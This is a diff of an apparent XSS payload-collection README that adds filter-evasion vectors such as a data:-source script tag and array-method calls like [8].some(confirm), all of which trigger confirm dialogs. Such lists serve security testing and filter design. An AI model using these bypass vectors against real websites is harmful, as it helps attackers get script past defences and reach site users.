@@ -35,7 +35,8 @@ Put this repo on watch. I will be updating it regularly.
 
 ### Awesome Payloads
 ```
-<--`<img/src=` onerror=alert(1)> --!>
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<--`<img/src=` onerror=confirm``> --!>
 <svg%0Aonload=%09((pro\u006dpt))()//
 <sCript x>(((confirm)))``</scRipt x>
 <svg/x=">"/onload=confirm()//
@@ -108,6 +109,12 @@ confirm``
 (((confirm)))``
 co\u006efirm()
 new class extends confirm``{}
+[8].find(confirm)
+[8].map(confirm)
+[8].some(confirm)
+[8].every(confirm)
+[8].filter(confirm)
+[8].findIndex(confirm)
 ```
 
 ### Awesome Exploits
